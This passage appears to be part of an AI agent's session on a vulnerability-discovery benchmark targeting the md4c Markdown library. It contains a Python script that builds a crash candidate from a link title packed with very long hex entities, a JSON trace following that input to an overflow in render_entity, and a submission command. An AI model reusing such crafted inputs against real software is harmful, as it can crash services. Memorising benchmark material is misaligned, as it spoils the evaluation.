from pathlib import Path
# Try a candidate with malformed numeric entities in a link title and lots of nesting
s = '[x](y "' + ('&#x' + 'F'*1000 + ';')*50 + '")'
Path('/workspace/candidate9.bin').write_bytes(b'\x00'*8 + s.encode())
print(len(s))
PY

  {"step":2,"file":"src-vul/md4c/test/fuzzers/fuzz-mdhtml.c","function":"LLVMFuzzerTestOneInput","line":13,"var":"renderer_flags","code":"unsigned int renderer_flags = *(unsigned int*)data;","note":"The next four bytes are attacker-controlled renderer flags."},
  {"step":3,"file":"src-vul/md4c/test/fuzzers/fuzz-mdhtml.c","function":"LLVMFuzzerTestOneInput","line":17,"var":"data,size","code":"md_html(data, size, process_output, out, parser_flags, renderer_flags);","note":"The remaining bytes are parsed as Markdown and rendered to HTML."},
  {"step":4,"file":"src-vul/md4c/src/md4c.c","function":"build_attribute","line":1419,"var":"build->substr_offsets","code":"build->substr_offsets = build->trivial_offsets;","note":"The parser constructs an attribute object for the link title and initializes its substring table."},
  {"step":5,"file":"src-vul/md4c/src/md4c.c","function":"build_attribute","line":1450,"var":"build->text + off","code":"memcpy(build->text + off, raw_text + raw_off, ent_end - raw_off);","note":"Attacker-controlled entity text is copied into the attribute buffer while preserving the entity delimiters."},
  {"step":6,"file":"src-vul/md4c/src/md4c.c","function":"build_attribute","line":1467,"var":"build->substr_offsets[build->substr_count]","code":"build->substr_offsets[build->substr_count] = off;","note":"The parser records the end of each substring, creating a table later consumed by the renderer."},
  {"step":7,"file":"src-vul/md4c/src/md4c-html.c","function":"render_open_a_span","line":334,"var":"det->title","code":"render_attribute(r, &det->title, render_html_escaped);","note":"The link title is rendered through the attribute walker, which will iterate over the attacker-controlled substrings."},
  {"step":8,"file":"src-vul/md4c/src/md4c-html.c","function":"render_attribute","line":254,"var":"attr->substr_offsets[i]","code":"for(i = 0; attr->substr_offsets[i] < attr->size; i++) {","note":"The renderer iterates over the substring table until it reaches the recorded size boundary."},
  {"step":9,"file":"src-vul/md4c/src/md4c-html.c","function":"render_attribute","line":262,"var":"type","code":"case MD_TEXT_ENTITY: render_entity(r, text, size, fn_append);","note":"Entity substrings are decoded instead of emitted verbatim, sending attacker-controlled digits into the entity decoder."},
  {"step":10,"file":"src-vul/md4c/src/md4c-html.c","function":"render_entity","line":221,"var":"codepoint","code":"for(i = 3; i < size-1; i++) codepoint = 16 * codepoint + hex_val(text[i]);","note":"A long hexadecimal entity drives repeated arithmetic on attacker-controlled bytes and can overflow the unsigned accumulator."},
  {"step":11,"file":"src-vul/md4c/src/md4c-html.c","function":"render_utf8_codepoint","line":170,"var":"utf8","code":"fn_append(r, (char*)utf8, n);","note":"The computed codepoint is converted to UTF-8 and appended to the output stream."},
  {"step":12,"file":"src-vul/md4c/test/fuzzers/fuzz-mdhtml.c","function":"process_output","line":7,"var":"out","code":"return;","note":"The harness ignores output, so the crash must happen in parsing or rendering of the attacker-controlled link data."}
]
JSON
bash /workspace/submit.sh /workspace/candidate9.bin /workspace/candidate_trace.json
